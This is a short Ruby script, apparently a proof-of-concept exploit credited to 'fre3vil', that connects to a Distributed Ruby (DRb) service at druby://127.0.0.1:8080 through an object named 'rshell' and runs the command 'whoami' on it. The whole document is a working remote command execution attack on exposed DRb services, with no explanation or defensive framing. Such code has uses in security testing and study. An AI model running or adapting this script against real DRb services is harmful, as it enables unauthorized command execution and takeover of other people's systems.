#!/usr/bin/env ruby
# code by fre3vil

require 'drb'

rshell = DRbObject.new_with_uri("druby://127.0.0.1:8080")
puts rshell.exec "whoami"

